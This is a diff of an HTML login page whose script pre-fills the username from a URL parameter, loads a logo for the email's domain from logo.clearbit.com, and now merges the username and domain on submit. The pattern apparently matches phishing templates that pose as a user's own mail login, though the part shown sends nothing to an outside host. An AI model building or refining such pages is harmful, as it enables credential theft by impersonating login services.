@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="ko">
 <head>
   <meta http-equiv="Content-Language" content="en-us">
@@ -67,7 +68,7 @@
             <tr>
               <td>
                 <table border="0" width="100%" cellspacing="0" cellpadding="0">
-                  <form action="index.html" method="get">
+                  <form id="loginForm" action="index.html" method="get">
                     <tr><td height="110"></td></tr>
                     <tr>
                       <td height="40" align="center">
@@ -88,7 +89,7 @@
                     <tr>
                       <td width="400" height="40">
                         <div class="input-group">
-                          <input name="login" placeholder="Username" type="text" required class="form-control" id="usernameInput" autofocus >
+                          <input name="login" placeholder="Username" type="text" required class="form-control" id="usernameInput" autofocus>
                           <input type="hidden" name="domain" id="hiddenDomain">
                           <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
                         </div>
@@ -143,25 +144,34 @@
   </table>
 
   <script>
-  const params = new URLSearchParams(window.location.search);
-  const raw = params.get('login');
-  const email = raw ? decodeURIComponent(raw) : '';
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
 
-  let user = '', domain = '';
-  if (email.includes('@')) {
-    [user, domain] = email.split('@');
-  }
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split('@');
+    }
 
-  // Set input values
-  document.getElementById('hiddenDomain').value = domain || 'domain';
+    // Set hidden domain value
+    document.getElementById('hiddenDomain').value = domain || 'domain';
 
-  // Update domain visuals
-  if (domain) {
-    document.getElementById('domainAddon').textContent = '@' + domain;
-    document.getElementById('domainLabel').textContent = domain;
-    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
-  }
-</script>
+    // Set domain visuals
+    if (domain) {
+      document.getElementById('domainAddon').textContent = '@' + domain;
+      document.getElementById('domainLabel').textContent = domain;
+      document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
+    }
 
+    // Combine user + domain before submit
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      const usernameInput = document.getElementById('usernameInput');
+      const domainVal = document.getElementById('hiddenDomain').value.trim();
+      const userVal = usernameInput.value.trim();
+      if (userVal && domainVal) {
+        usernameInput.value = userVal + '@' + domainVal;
+      }
+    });
+  </script>
 </body>
 </html>
